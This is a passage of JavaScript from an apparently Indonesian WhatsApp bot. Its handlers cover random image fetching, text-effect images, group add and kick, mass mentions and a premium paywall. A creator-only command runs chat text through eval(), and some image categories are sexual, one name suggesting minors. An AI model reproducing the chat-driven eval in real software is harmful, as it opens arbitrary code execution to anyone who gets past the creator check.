if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/shota.json')
if (/tatasurya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/tejina.json')
if (/tentacles/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/tentacles.json')
if (/thighs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/thighs.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
sock.sendMessage(from, { image: { url:yeha }, caption: `${yeha}` }, { quoted: m })
}
break
case "glitchtext":
case "writetext":
case "advancedglow":
case "typographytext":
case "pixelglitch":
case "neonglitch":
case "flagtext":
case "flag3dtext":
case "deletingtext":
case "blackpinkstyle":
case "glowingtext":
case "underwatertext":
case "logomaker":
case "cartoonstyle":
case "papercutstyle":
case "watercolortext":
case "effectclouds":
case "blackpinklogo":
case "gradienttext":
case "summerbeach":
case "luxurygold":
case "multicoloredneon":
case "sandsummer":
case "galaxywallpaper":
case "1917style":
case "makingneon":
case "royaltext":
case "freecreate":
case "galaxystyle":
case "lighteffects":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Example : ${prefix+command} Dims Bot`) 
reply("```Wet Sabar Lagi Proses```")
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto360(link, q)
sock.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${haldwhd}` }, { quoted: m })
}
break
case "shadow": 
case "write": 
case "romantic": 
case "burnpaper":
case "smoke": 
case "narutobanner": 
case "love": 
case "undergrass":
case "doublelove": 
case "coffecup":
case "underwaterocean":
case "smokyneon":
case "starstext":
case "rainboweffect":
case "balloontext":
case "metalliceffect":
case "embroiderytext":
case "flamingtext":
case "stonetext":
case "writeart":
case "summertext":
case "wolfmetaltext":
case "nature3dtext":
case "rosestext":
case "naturetypography":
case "quotesunder":
case "shinetext":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Example : ${prefix+command} Dims Bot`) 
reply("```Wet Sabar Lagi Proses```")
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy(link, q)
sock.sendMessage(m.chat, { image: { url: dehe }, caption: `${dehe}` }, { quoted: m })
}
break
case "setppbot": {
if (!isCreator) return 
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await sock.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await sock.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses`)
} else {
var memeg = await sock.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
break
case "styletext":{
if (!q) return reply(`Contoh ${prefix+command} akira`)
reply("```Wet Sabar Lagi Proses```")
let res = await style(q)
reply(util.format(res))
}
break
case "add": {
if (!m.isGroup) return reply(`Khusus Di Dalam Group`)
if (!isGroupAdmins && !isCreator) return reply(`Khusus Admin`)
if (!isBotAdmins) return reply(`Jadikan Bot Sebagai Admin Terlebih Dahulu`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sock.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case "kick": {
if (!m.isGroup) return reply(`Khusus Di Dalam Group`)
if (!isGroupAdmins && !isCreator) return reply(`Khusus Admin`)
if (!isBotAdmins) return reply(`Jadikan Bot Sebagai Admin Terlebih Dahulu`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sock.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case "hidetag": case "h": {
if (!m.isGroup) return reply(`Khusus Di Dalam Group`)
if (!isGroupAdmins && !isCreator) return reply(`Khusus Admin`)
if (!q) return reply(`Teks?`)
sock.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "tagall": {
if (!m.isGroup) return reply(`Khusus Di Dalam Group`)
if (!isGroupAdmins && !isCreator) return reply(`Khusus Admin`)
if (!q) return reply(`Teks?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
sock.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case ">":
case "=>":
if (!isCreator) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
reply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break
default:

if (budy.startsWith('××')) {
if (!isCreator) return
try {
